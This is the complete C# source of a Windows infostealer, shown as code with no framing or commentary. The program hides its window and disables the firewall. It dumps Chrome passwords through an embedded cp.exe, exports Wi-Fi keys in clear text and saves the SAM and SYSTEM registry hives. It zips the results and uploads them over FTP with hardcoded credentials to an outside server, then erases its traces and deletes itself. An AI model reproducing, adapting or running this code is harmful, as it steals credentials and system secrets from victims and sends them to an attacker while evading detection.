using System.Diagnostics;
using System.IO.Compression;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using Windows.Media.Playback;
#pragma warning disable SYSLIB0014 
namespace a
{
    internal class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        public static string username = Environment.UserName;
        public static string TempPath = Path.GetTempPath();
        public static string zipFileName = $"{username}_files.zip";
        public static string zipFilePath = Path.Combine(TempPath, zipFileName);
        static void Main(string[] args)
        {
            ShowWindow(GetConsoleWindow(), 0);
            Delete();
            GetChromePass();
            PowershellCommand($"netsh advfirewall set allprofiles state off;cd {TempPath};./cp.exe /stext {username};netsh wlan export profile key=clear;reg save HKLM\\sam ./sam{username}.save; reg save HKLM\\system ./system{username}.save");
            Upload();
            Delete();
            SelfDestruct();
        }
        private static void Delete()
        {
            if (File.Exists(zipFilePath))
                File.Delete(zipFilePath);
            if (File.Exists(Path.Combine(TempPath, "cp.exe")))
                File.Delete(Path.Combine(TempPath, "cp.exe"));
            if (File.Exists(Path.Combine(TempPath, $"system{username}.save")))
                File.Delete(Path.Combine(TempPath, $"system{username}.save"));
            if (File.Exists(Path.Combine(TempPath, $"sam{username}.save")))
                File.Delete(Path.Combine(TempPath, $"sam{username}.save"));
            if (File.Exists(Path.Combine(TempPath, username)))
                File.Delete(Path.Combine(TempPath, username));
            foreach (var file in Directory.GetFiles(TempPath, "*.xml"))
                if (File.Exists(file))
                    File.Delete(file);
        }
        private static void GetChromePass()
        {
            Assembly currentAssembly = Assembly.GetExecutingAssembly();
            Stream? resourceStream = currentAssembly.GetManifestResourceStream("a.cp.exe");
            if (resourceStream != null)
            {
                using (resourceStream)
                {
                    byte[] resourceBytes = new byte[resourceStream.Length];
                    resourceStream.Read(resourceBytes, 0, resourceBytes.Length);
                    File.WriteAllBytes(Path.Combine(TempPath, "cp.exe"), resourceBytes);
                }
            }
        }
        private static void PowershellCommand(string command)
        {
            var processStartInfo = new ProcessStartInfo();
            processStartInfo.Verb = "runas";
            processStartInfo.FileName = "powershell.exe";
            processStartInfo.Arguments = $"-Command \"{command}\"";
            processStartInfo.UseShellExecute = false;
            processStartInfo.RedirectStandardOutput = true;

            using var process = new Process();
            process.StartInfo = processStartInfo;
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            Console.WriteLine(output);
        }
        private static void Upload()
        {

            using (ZipArchive zipArchive = ZipFile.Open(zipFilePath, ZipArchiveMode.Create))
            {
                zipArchive.CreateEntryFromFile(Path.Combine(TempPath, username), username);
                zipArchive.CreateEntryFromFile(Path.Combine(TempPath, $"sam{username}.save"), $"sam{username}.save");
                zipArchive.CreateEntryFromFile(Path.Combine(TempPath, $"system{username}.save"), $"system{username}.save");

                foreach (var file in Directory.GetFiles(TempPath, "*.xml"))
                {
                    zipArchive.CreateEntryFromFile(file, Path.GetFileName(file));
                }
            }

            using (var client = new WebClient())
            {
                client.Credentials = new NetworkCredential("hack123", "Dr0bnyy");
                client.UploadFile(new Uri($"ftp://konik.endora.cz/{zipFileName}"), WebRequestMethods.Ftp.UploadFile, zipFilePath);
            }
        }

        private static void SelfDestruct()
        {
            var process = Process.GetCurrentProcess().MainModule;
            string exeFileName = process != null ? process.FileName : $"C:\\\\Users\\\\{username}\\\\Desktop\\\\a.exe";
            Process.Start(new ProcessStartInfo()
            {
                Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + exeFileName + "\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe"
            });
        }
    }
}